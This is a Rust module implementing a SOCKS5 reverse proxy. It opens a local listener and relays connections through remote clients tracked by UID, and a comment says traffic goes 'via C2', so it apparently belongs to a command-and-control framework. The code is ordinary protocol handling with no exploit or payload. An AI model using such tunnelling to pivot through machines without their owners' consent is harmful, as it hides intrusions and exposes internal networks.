//! SOCKS5 reverse proxy implementation.
//!
//! Provides a local SOCKS5 server that tunnels connections through connected clients.

use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::Arc;

use parking_lot::RwLock;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{mpsc, oneshot};

use crate::logging::SharedLogStore;

/// SOCKS5 protocol constants
const SOCKS5_VERSION: u8 = 0x05;
const SOCKS5_AUTH_NONE: u8 = 0x00;
const SOCKS5_CMD_CONNECT: u8 = 0x01;
const SOCKS5_ATYP_IPV4: u8 = 0x01;
const SOCKS5_ATYP_DOMAIN: u8 = 0x03;
const SOCKS5_ATYP_IPV6: u8 = 0x04;
const SOCKS5_REP_SUCCESS: u8 = 0x00;
const SOCKS5_REP_GENERAL_FAILURE: u8 = 0x01;
const SOCKS5_REP_CONN_REFUSED: u8 = 0x05;
const SOCKS5_REP_HOST_UNREACHABLE: u8 = 0x04;

use wavegate_shared::ProxyTarget;

/// Messages sent from proxy manager to client handler
#[derive(Debug, Clone)]
pub enum ProxyToClient {
    /// Request TCP connection to target (legacy)
    Connect { conn_id: u32, host: String, port: u16 },
    /// Request connection to target (unified - supports TCP, local pipe, remote pipe)
    ConnectTarget { conn_id: u32, target: ProxyTarget },
    /// Send data to target
    Data { conn_id: u32, data: Vec<u8> },
    /// Close connection
    Close { conn_id: u32 },
}

/// Messages sent from client handler to proxy manager
#[derive(Debug)]
pub enum ClientToProxy {
    /// Connection result
    ConnectResult {
        conn_id: u32,
        success: bool,
        error: Option<String>,
        bound_addr: Option<String>,
        bound_port: Option<u16>,
    },
    /// Data from target
    Data { conn_id: u32, data: Vec<u8> },
    /// Connection closed by target
    Closed { conn_id: u32, reason: Option<String> },
}

/// Active proxy connection state
struct ProxyConnection {
    /// Channel to send data to the SOCKS5 client
    data_tx: mpsc::Sender<Vec<u8>>,
    /// Notifier for connection result
    connect_result_tx: Option<oneshot::Sender<(bool, Option<String>)>>,
}

/// Proxy manager for a specific client
pub struct ClientProxyManager {
    /// Client UID
    client_uid: String,
    /// Active connections
    connections: RwLock<HashMap<u32, ProxyConnection>>,
    /// Next connection ID
    next_conn_id: AtomicU32,
    /// Channel to send messages to client handler
    to_client_tx: mpsc::Sender<ProxyToClient>,
    /// Log store
    log_store: SharedLogStore,
}

impl ClientProxyManager {
    pub fn new(
        client_uid: String,
        to_client_tx: mpsc::Sender<ProxyToClient>,
        log_store: SharedLogStore,
    ) -> Self {
        Self {
            client_uid,
            connections: RwLock::new(HashMap::new()),
            next_conn_id: AtomicU32::new(1),
            to_client_tx,
            log_store,
        }
    }

    /// Allocate a new connection ID
    fn next_id(&self) -> u32 {
        self.next_conn_id.fetch_add(1, Ordering::Relaxed)
    }

    /// Handle a new SOCKS5 connection
    pub async fn handle_socks_connection(&self, mut stream: TcpStream) -> Result<(), String> {
        // SOCKS5 handshake - greeting
        let mut buf = [0u8; 2];
        stream.read_exact(&mut buf).await.map_err(|e| e.to_string())?;

        if buf[0] != SOCKS5_VERSION {
            return Err("Not SOCKS5".to_string());
        }

        let nmethods = buf[1] as usize;
        let mut methods = vec![0u8; nmethods];
        stream.read_exact(&mut methods).await.map_err(|e| e.to_string())?;

        // We only support no auth
        if !methods.contains(&SOCKS5_AUTH_NONE) {
            stream.write_all(&[SOCKS5_VERSION, 0xFF]).await.map_err(|e| e.to_string())?;
            return Err("No supported auth method".to_string());
        }

        // Accept no auth
        stream.write_all(&[SOCKS5_VERSION, SOCKS5_AUTH_NONE]).await.map_err(|e| e.to_string())?;

        // Read connection request
        let mut header = [0u8; 4];
        stream.read_exact(&mut header).await.map_err(|e| e.to_string())?;

        if header[0] != SOCKS5_VERSION {
            return Err("Invalid SOCKS5 request".to_string());
        }

        if header[1] != SOCKS5_CMD_CONNECT {
            // Only CONNECT is supported
            self.send_socks_error(&mut stream, SOCKS5_REP_GENERAL_FAILURE).await;
            return Err("Only CONNECT command supported".to_string());
        }

        // Parse address
        let (host, port) = match header[3] {
            SOCKS5_ATYP_IPV4 => {
                let mut addr = [0u8; 4];
                stream.read_exact(&mut addr).await.map_err(|e| e.to_string())?;
                let mut port_buf = [0u8; 2];
                stream.read_exact(&mut port_buf).await.map_err(|e| e.to_string())?;
                let port = u16::from_be_bytes(port_buf);
                let host = format!("{}.{}.{}.{}", addr[0], addr[1], addr[2], addr[3]);
                (host, port)
            }
            SOCKS5_ATYP_DOMAIN => {
                let mut len_buf = [0u8; 1];
                stream.read_exact(&mut len_buf).await.map_err(|e| e.to_string())?;
                let len = len_buf[0] as usize;
                let mut domain = vec![0u8; len];
                stream.read_exact(&mut domain).await.map_err(|e| e.to_string())?;
                let mut port_buf = [0u8; 2];
                stream.read_exact(&mut port_buf).await.map_err(|e| e.to_string())?;
                let port = u16::from_be_bytes(port_buf);
                let host = String::from_utf8_lossy(&domain).to_string();
                (host, port)
            }
            SOCKS5_ATYP_IPV6 => {
                let mut addr = [0u8; 16];
                stream.read_exact(&mut addr).await.map_err(|e| e.to_string())?;
                let mut port_buf = [0u8; 2];
                stream.read_exact(&mut port_buf).await.map_err(|e| e.to_string())?;
                let port = u16::from_be_bytes(port_buf);
                let host = format!(
                    "{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}",
                    u16::from_be_bytes([addr[0], addr[1]]),
                    u16::from_be_bytes([addr[2], addr[3]]),
                    u16::from_be_bytes([addr[4], addr[5]]),
                    u16::from_be_bytes([addr[6], addr[7]]),
                    u16::from_be_bytes([addr[8], addr[9]]),
                    u16::from_be_bytes([addr[10], addr[11]]),
                    u16::from_be_bytes([addr[12], addr[13]]),
                    u16::from_be_bytes([addr[14], addr[15]]),
                );
                (host, port)
            }
            _ => {
                self.send_socks_error(&mut stream, SOCKS5_REP_GENERAL_FAILURE).await;
                return Err("Unsupported address type".to_string());
            }
        };

        // Allocate connection ID
        let conn_id = self.next_id();

        self.log_store.client_info(
            &self.client_uid,
            format!("Proxy #{}: connecting to {}:{}", conn_id, host, port),
        );

        // Create channels for this connection
        let (data_tx, mut data_rx) = mpsc::channel::<Vec<u8>>(64);
        let (connect_result_tx, connect_result_rx) = oneshot::channel();

        // Store connection state
        {
            let mut conns = self.connections.write();
            conns.insert(conn_id, ProxyConnection {
                data_tx,
                connect_result_tx: Some(connect_result_tx),
            });
        }

        // Send connect request to client
        let _ = self.to_client_tx.send(ProxyToClient::Connect {
            conn_id,
            host: host.clone(),
            port,
        }).await;

        // Wait for connection result with timeout
        let connect_result = tokio::time::timeout(
            std::time::Duration::from_secs(30),
            connect_result_rx,
        ).await;

        let (success, error) = match connect_result {
            Ok(Ok((success, error))) => (success, error),
            Ok(Err(_)) => (false, Some("Connection cancelled".to_string())),
            Err(_) => (false, Some("Connection timeout".to_string())),
        };

        if !success {
            self.log_store.client_warning(
                &self.client_uid,
                format!("Proxy #{}: connection failed - {}", conn_id, error.as_deref().unwrap_or("unknown")),
            );
            self.send_socks_error(&mut stream, SOCKS5_REP_HOST_UNREACHABLE).await;
            self.connections.write().remove(&conn_id);
            return Err(error.unwrap_or_else(|| "Connection failed".to_string()));
        }

        // Send success response
        // Reply: VER | REP | RSV | ATYP | BND.ADDR | BND.PORT
        let reply = [
            SOCKS5_VERSION,
            SOCKS5_REP_SUCCESS,
            0x00,
            SOCKS5_ATYP_IPV4,
            0, 0, 0, 0, // Bound address (0.0.0.0)
            0, 0,       // Bound port (0)
        ];
        if stream.write_all(&reply).await.is_err() {
            self.cleanup_connection(conn_id).await;
            return Err("Failed to send SOCKS5 reply".to_string());
        }

        self.log_store.client_success(
            &self.client_uid,
            format!("Proxy #{}: connected to {}:{}", conn_id, host, port),
        );

        // Now relay data bidirectionally
        let to_client_tx = self.to_client_tx.clone();
        let client_uid = self.client_uid.clone();
        let log_store = self.log_store.clone();

        let (mut reader, mut writer) = stream.into_split();

        // Task: read from SOCKS client, send to target via C2
        let conn_id_read = conn_id;
        let to_client_tx_read = to_client_tx.clone();
        let read_task = tokio::spawn(async move {
            let mut buf = vec![0u8; 8192];
            loop {
                match reader.read(&mut buf).await {
                    Ok(0) => break, // EOF
                    Ok(n) => {
                        let _ = to_client_tx_read.send(ProxyToClient::Data {
                            conn_id: conn_id_read,
                            data: buf[..n].to_vec(),
                        }).await;
                    }
                    Err(_) => break,
                }
            }
            // Signal close
            let _ = to_client_tx_read.send(ProxyToClient::Close { conn_id: conn_id_read }).await;
        });

        // Task: receive data from target (via data_rx), write to SOCKS client
        let write_task = tokio::spawn(async move {
            while let Some(data) = data_rx.recv().await {
                if writer.write_all(&data).await.is_err() {
                    break;
                }
            }
        });

        // Wait for either task to complete
        tokio::select! {
            _ = read_task => {}
            _ = write_task => {}
        }

        self.log_store.client_info(
            &self.client_uid,
            format!("Proxy #{}: connection closed", conn_id),
        );

        self.cleanup_connection(conn_id).await;
        Ok(())
    }

    async fn send_socks_error(&self, stream: &mut TcpStream, rep: u8) {
        let reply = [
            SOCKS5_VERSION,
            rep,
            0x00,
            SOCKS5_ATYP_IPV4,
            0, 0, 0, 0,
            0, 0,
        ];
        let _ = stream.write_all(&reply).await;
    }

    async fn cleanup_connection(&self, conn_id: u32) {
        self.connections.write().remove(&conn_id);
        let _ = self.to_client_tx.send(ProxyToClient::Close { conn_id }).await;
    }

    /// Handle message from client
    pub fn handle_client_message(&self, msg: ClientToProxy) {
        match msg {
            ClientToProxy::ConnectResult { conn_id, success, error, .. } => {
                let mut conns = self.connections.write();
                if let Some(conn) = conns.get_mut(&conn_id) {
                    if let Some(tx) = conn.connect_result_tx.take() {
                        let _ = tx.send((success, error));
                    }
                }
            }
            ClientToProxy::Data { conn_id, data } => {
                let conns = self.connections.read();
                if let Some(conn) = conns.get(&conn_id) {
                    let _ = conn.data_tx.try_send(data);
                }
            }
            ClientToProxy::Closed { conn_id, .. } => {
                self.connections.write().remove(&conn_id);
            }
        }
    }

    /// Get number of active connections
    pub fn active_connections(&self) -> usize {
        self.connections.read().len()
    }
}

/// Shared proxy manager
pub type SharedClientProxyManager = Arc<ClientProxyManager>;

/// Global proxy state - manages SOCKS5 listener for a client
pub struct ProxyServer {
    /// Client UID this proxy is for
    pub client_uid: String,
    /// Local bind address
    pub bind_addr: SocketAddr,
    /// Proxy manager
    pub manager: SharedClientProxyManager,
    /// Shutdown signal
    shutdown_tx: Option<oneshot::Sender<()>>,
}

impl ProxyServer {
    /// Start a new proxy server for a client
    pub async fn start(
        client_uid: String,
        port: u16,
        to_client_tx: mpsc::Sender<ProxyToClient>,
        log_store: SharedLogStore,
    ) -> Result<Self, String> {
        let bind_addr: SocketAddr = format!("127.0.0.1:{}", port)
            .parse()
            .map_err(|e| format!("Invalid address: {}", e))?;

        let listener = TcpListener::bind(bind_addr)
            .await
            .map_err(|e| format!("Failed to bind: {}", e))?;

        let actual_addr = listener.local_addr().map_err(|e| e.to_string())?;

        let manager = Arc::new(ClientProxyManager::new(
            client_uid.clone(),
            to_client_tx,
            log_store.clone(),
        ));

        let (shutdown_tx, mut shutdown_rx) = oneshot::channel();

        // Spawn accept loop
        let manager_clone = manager.clone();
        let client_uid_clone = client_uid.clone();
        let log_store_clone = log_store.clone();

        tokio::spawn(async move {
            log_store_clone.client_success(
                &client_uid_clone,
                format!("SOCKS5 proxy started on {}", actual_addr),
            );

            loop {
                tokio::select! {
                    _ = &mut shutdown_rx => {
                        break;
                    }
                    accept_result = listener.accept() => {
                        match accept_result {
                            Ok((stream, peer)) => {
                                let mgr = manager_clone.clone();
                                tokio::spawn(async move {
                                    if let Err(e) = mgr.handle_socks_connection(stream).await {
                                        eprintln!("SOCKS connection error from {}: {}", peer, e);
                                    }
                                });
                            }
                            Err(e) => {
                                eprintln!("Accept error: {}", e);
                            }
                        }
                    }
                }
            }

            log_store_clone.client_info(&client_uid_clone, "SOCKS5 proxy stopped");
        });

        Ok(Self {
            client_uid,
            bind_addr: actual_addr,
            manager,
            shutdown_tx: Some(shutdown_tx),
        })
    }

    /// Stop the proxy server
    pub fn stop(&mut self) {
        if let Some(tx) = self.shutdown_tx.take() {
            let _ = tx.send(());
        }
    }
}

impl Drop for ProxyServer {
    fn drop(&mut self) {
        self.stop();
    }
}

/// Global registry of active proxy servers
pub struct ProxyRegistry {
    /// Map of client UID to proxy server
    servers: RwLock<HashMap<String, Arc<RwLock<ProxyServer>>>>,
}

impl ProxyRegistry {
    pub fn new() -> Self {
        Self {
            servers: RwLock::new(HashMap::new()),
        }
    }

    /// Start a proxy for a client
    pub async fn start_proxy(
        &self,
        client_uid: String,
        port: u16,
        to_client_tx: mpsc::Sender<ProxyToClient>,
        log_store: SharedLogStore,
    ) -> Result<SocketAddr, String> {
        // Stop existing proxy if any
        self.stop_proxy(&client_uid);

        let server = ProxyServer::start(client_uid.clone(), port, to_client_tx, log_store).await?;
        let addr = server.bind_addr;

        self.servers.write().insert(client_uid, Arc::new(RwLock::new(server)));

        Ok(addr)
    }

    /// Stop a proxy for a client
    pub fn stop_proxy(&self, client_uid: &str) -> bool {
        if let Some(server) = self.servers.write().remove(client_uid) {
            server.write().stop();
            true
        } else {
            false
        }
    }

    /// Get proxy manager for a client (for handling client messages)
    pub fn get_manager(&self, client_uid: &str) -> Option<SharedClientProxyManager> {
        self.servers.read().get(client_uid).map(|s| s.read().manager.clone())
    }

    /// Check if a proxy is running for a client
    pub fn is_running(&self, client_uid: &str) -> bool {
        self.servers.read().contains_key(client_uid)
    }

    /// Get proxy info for a client
    pub fn get_proxy_info(&self, client_uid: &str) -> Option<(SocketAddr, usize)> {
        self.servers.read().get(client_uid).map(|s| {
            let server = s.read();
            (server.bind_addr, server.manager.active_connections())
        })
    }
}

impl Default for ProxyRegistry {
    fn default() -> Self {
        Self::new()
    }
}

/// Shared proxy registry
pub type SharedProxyRegistry = Arc<ProxyRegistry>;
